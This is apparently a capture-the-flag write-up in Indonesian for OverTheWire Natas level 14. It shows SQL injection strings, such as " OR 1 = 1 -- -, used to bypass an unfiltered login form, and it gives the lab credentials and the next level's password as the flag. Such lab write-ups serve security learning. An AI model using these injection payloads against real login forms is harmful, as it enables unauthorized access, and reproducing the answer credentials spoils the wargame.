---
layout: level
level: 14
previous: ./level 13.html
next: ./level 15.html
---

# soal
Username: natas14 \
URL:      http://natas14.natas.labs.overthewire.org

# solve
- login with cred natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
- di soal kali ini terdapat sebuah form login username admin disini ketika saya coba cek sourcenya terdapat connect database hanya saja tidak ada filternya
  ![alt text](docs/images/image-35.png)
  ```bash
  SELECT * FROM USERS WHERE username = '<input>' AND password = '<input>';
  # pas dicoba " dia berhasil
  SELECT * FROM USERS WHERE username = '"<input>' AND password = '<input>';

  "admin
  " OR "1" = "1
  " OR "test" = "test
  ```
- saya mencoba memasukan sqli manual dengan wordlist ini
  - https://github.com/payloadbox/sql-injection-payload-list
- waktu saya mencoba yang ini berhasil
  ![alt text](docs/images/image-36.png)
  ![alt text](docs/images/image-37.png)
  ```bash
  " OR 1 = 1 -- -
  ```
- output
  ```bash
  # Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
  ```

# flag
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx